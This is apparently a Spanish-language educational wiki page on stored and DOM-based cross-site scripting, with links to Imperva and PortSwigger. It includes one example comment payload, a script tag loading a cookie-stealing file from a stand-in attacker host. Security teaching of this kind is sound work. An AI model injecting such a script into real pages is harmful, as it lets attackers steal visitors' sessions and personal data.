---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Stored Cross Site Scripting

Los ataques XSS almacenados o persistentes ocurren cuando un código o script malicioso se almacena permanentemente en un servidor vulnerable o malicioso, utilizando una base de datos.

Mientras navega por un sitio web de comercio electrónico, un delincuente descubre una vulnerabilidad que permite incrustar etiquetas HTML en la sección de comentarios del sitio. Las etiquetas incrustadas se convierten en una característica permanente de la página, lo que hace que el navegador las analice con el resto del código fuente cada vez que se abre la página.

El atacante añade el siguiente comentario:  ¡Gran precio por un gran artículo! Lea mi reseña aquí \<script src=”http://hackersite.com/authstealer.js”> \</script> .

A partir de este momento, cada vez que se acceda a la página, la etiqueta HTML en el comentario activará un archivo JavaScript, que está alojado en otro sitio y tiene la capacidad de robar las cookies de sesión de los visitantes.

Al utilizar la cookie de sesión, el atacante puede comprometer la cuenta del visitante, permitiéndole acceder fácilmente a su información personal y a los datos de su tarjeta de crédito. Mientras tanto, el visitante, que tal vez ni siquiera haya bajado a la sección de comentarios, no sabe que se produjo el ataque.

A diferencia de un ataque reflejado, donde el script se activa después de hacer clic en un enlace, un ataque almacenado sólo requiere que la víctima visite el [página web comprometida](https://www.imperva.com/learn/application-security/cyber-security/) . Esto aumenta el alcance del ataque, poniendo en peligro a todos los visitantes sin importar su nivel de vigilancia.

Desde el punto de vista del perpetrador, los ataques XSS persistentes son relativamente más difíciles de ejecutar debido a las dificultades para localizar tanto un sitio web con tráfico como uno con vulnerabilidades que permitan la incrustación permanente de scripts.

En este ejemplo, el mensaje del cuadro de diálogo es "¡Omar estuvo aquí!" Sin embargo, en un ataque real, un atacante podría presentar a los usuarios un texto que los persuada a realizar una acción específica, como "su contraseña ha caducado" o "inicie sesión nuevamente". El objetivo del atacante sería redirigir al usuario a otro sitio para robar sus credenciales cuando el usuario intente cambiar la contraseña o iniciar sesión nuevamente en la aplicación falsa.

El modelo de objetos de documento (DOM) es una interfaz de programación de aplicaciones multiplataforma e independiente del lenguaje que trata un documento HTML, XHTML o XML como una estructura de árbol. Los ataques basados ​​en DOM suelen ser ataques XSS reflejados que se activan mediante el envío de un enlace con entradas que se reflejan en el navegador web. En los ataques XSS basados ​​en DOM, la carga útil nunca se envía al servidor. En cambio, la carga útil solo la procesa el cliente web (navegador).

En un ataque XSS basado en DOM, el atacante envía una URL maliciosa a la víctima y, después de que la víctima hace clic en el enlace, el atacante puede cargar un sitio web malicioso o un sitio que tiene un controlador de ruta DOM vulnerable. Una vez que el navegador representa el sitio vulnerable, la carga útil ejecuta el ataque en el contexto del usuario en ese sitio.

Uno de los efectos de cualquier tipo de ataque XSS es que la víctima normalmente no se da cuenta de que se ha producido un ataque.

<mark style="color:red;">**Recursos**</mark>

{% embed url="https://www.imperva.com/learn/application-security/cross-site-scripting-xss-attacks/" %}

{% embed url="https://portswigger.net/web-security/cross-site-scripting/stored" %}

{% embed url="https://portswigger.net/web-security/cross-site-scripting" %}
